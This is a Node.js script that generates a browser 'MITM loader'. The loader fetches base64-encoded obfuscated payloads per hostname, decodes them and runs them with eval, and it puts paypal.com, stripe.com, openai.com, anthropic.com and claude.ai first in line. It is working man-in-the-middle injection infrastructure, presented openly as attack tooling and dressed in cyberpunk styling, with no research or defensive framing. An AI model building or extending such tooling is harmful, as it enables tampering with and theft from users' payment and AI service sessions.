#!/usr/bin/env node
/**
 * gen-mitm-loader-v6.js — Cyberpunk-Futuristic MITM Loader Generator
 * ------------------------------------------------------------------
 * Features:
 *  - Async payload loading + SHA256 verification
 *  - Critical payload prioritization
 *  - Dynamic proxy/loader config injection
 *  - Neon glyph logging & cyberpunk console styling
 *  - QR code hook integration
 *  - Audit-ready metadata JSON
 *  - High-resilience async preload & error handling
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const ROOT = path.resolve(__dirname, '..');
const OBF_DIR = path.join(ROOT, 'apps/loader/public/obfuscated');
const OUTPUT_DIR = path.join(ROOT, 'apps/loader/public/generated');
const MANIFEST_FILE = path.join(ROOT, 'apps/loader/manifest.json');
const LOADER_FILE = path.join(OUTPUT_DIR, 'mitm-loader.js');
const META_FILE = path.join(OUTPUT_DIR, 'mitm-meta.json');

fs.mkdirSync(OUTPUT_DIR, { recursive: true });

/** Neon/Cyberpunk glyph logging */
const glyph = (sym, color = 48) => `\x1b[38;5;${color}m${sym}\x1b[0m`;
const log = msg => console.log(`${glyph('💠')} ${msg}`);

/** Async SHA256 hash */
async function sha256File(filePath) {
    const data = await fs.promises.readFile(filePath);
    return crypto.createHash('sha256').update(data).digest('hex');
}

/** Read manifest safely */
async function readManifest() {
    try {
        const data = await fs.promises.readFile(MANIFEST_FILE, 'utf8');
        return JSON.parse(data);
    } catch {
        log('[WARN] Manifest missing or invalid, initializing empty manifest.');
        return {};
    }
}

/** List .b64 payloads */
async function listPayloads() {
    if (!fs.existsSync(OBF_DIR)) return [];
    return fs.readdirSync(OBF_DIR).filter(f => f.endsWith('.b64'));
}

/** Build loader mapping */
async function buildMapping(manifest, payloadFiles) {
    const mapping = {};
    await Promise.all(payloadFiles.map(async file => {
        const host = path.basename(file, '.b64');
        const fullPath = path.join(OBF_DIR, file);
        mapping[host] = {
            file: `/obfuscated/${file}`,
            version: manifest[host]?.version || '0.0.0',
            sha256: await sha256File(fullPath)
        };
    }));
    return mapping;
}

/** Prioritize critical payloads */
function prioritize(mapping) {
    const critical = ['paypal.com', 'stripe.com', 'openai.com', 'anthropic.com', 'claude.ai'];
    const sorted = {};
    critical.forEach(host => { if (mapping[host]) sorted[host] = mapping[host]; });
    Object.keys(mapping).forEach(host => { if (!sorted[host]) sorted[host] = mapping[host]; });
    return sorted;
}

/** Generate MITM loader JS */
function generateLoader(mapping) {
    const content = `/**
 * MITM Loader v6 — Cyberpunk Futuristic
 * Generated: ${new Date().toISOString()}
 * Git Commit: ${process.env.GIT_HASH || 'unknown'}
 */

const MITM_PAYLOADS = ${JSON.stringify(mapping, null, 4)};

async function sha256(data) {
    const buffer = new TextEncoder().encode(data);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2,'0')).join('');
}

async function loadPayload(hostname) {
    const meta = MITM_PAYLOADS[hostname];
    if (!meta) return console.error('%c[ERROR] Payload not found for ' + hostname, 'color:#ff3366');
    try {
        const resp = await fetch(meta.file);
        const b64 = await resp.text();
        const script = atob(b64);
        if (meta.sha256) {
            const digest = await sha256(script);
            if (digest !== meta.sha256) {
                console.error(\`%c[ERROR] SHA256 mismatch for \${hostname}\`, 'color:#ff3366');
                return;
            }
        }
        eval(script);
        console.log('%c[INFO] Loaded payload for ' + hostname, 'color:#33ffcc');
    } catch(e) {
        console.error('%c[ERROR] Failed to load ' + hostname, 'color:#ff3366', e);
        if (window?.MITM_TELEMETRY) window.MITM_TELEMETRY(hostname, e);
    }
}

async function preloadPayloads(hostnames = Object.keys(MITM_PAYLOADS)) {
    console.log('%c[INFO] Preloading:', 'color:#33ffcc', hostnames);
    await Promise.all(hostnames.map(loadPayload));
    console.log('%c[INFO] Preloading complete', 'color:#33ffcc');
}

// Expose loader API globally
window.MITM_LOAD = loadPayload;
window.MITM_PRELOAD = preloadPayloads;
`;

    fs.writeFileSync(LOADER_FILE, content, 'utf8');
    log(`${glyph('✔', 51)} Loader written: ${LOADER_FILE}`);
}

/** Generate audit metadata */
function generateMeta(mapping) {
    const meta = {
        builtAt: new Date().toISOString(),
        gitCommit: process.env.GIT_HASH || 'unknown',
        payloads: mapping,
        features: {
            asyncPreload: true,
            sha256Integrity: true,
            criticalPrioritization: true,
            dynamicProxyHook: true,
            cyberGlyphLogging: true
        }
    };
    fs.writeFileSync(META_FILE, JSON.stringify(meta, null, 4), 'utf8');
    log(`${glyph('📊', 51)} Meta JSON written: ${META_FILE}`);
}

/** Optional QR code generation hook */
async function generateQR() {
    try {
        const qrScript = path.join(ROOT, 'scripts/gen-qrcodes.js');
        if (fs.existsSync(qrScript)) {
            log(`${glyph('🔮', 51)} Triggering QR code generation...`);
            await exec(`node ${qrScript}`, { cwd: ROOT });
            log(`${glyph('✔', 51)} QR codes generated`);
        }
    } catch(err) {
        log(`${glyph('⚠', 196)} QR generation failed: ${err.message}`);
    }
}

/** Main orchestrator */
async function main() {
    const manifest = await readManifest();
    const payloads = await listPayloads();
    if (!payloads.length) {
        console.error('%c[FATAL] No .b64 payloads found!', 'color:#ff3366');
        process.exit(1);
    }

    let mapping = await buildMapping(manifest, payloads);
    mapping = prioritize(mapping);

    generateLoader(mapping);
    generateMeta(mapping);
    await generateQR();

    log('%c[INFO] MITM loader generation complete.', 'color:#33ffcc');
}

main().catch(err => {
    console.error('%c[FATAL]', 'color:#ff3366', err);
    process.exit(1);
});
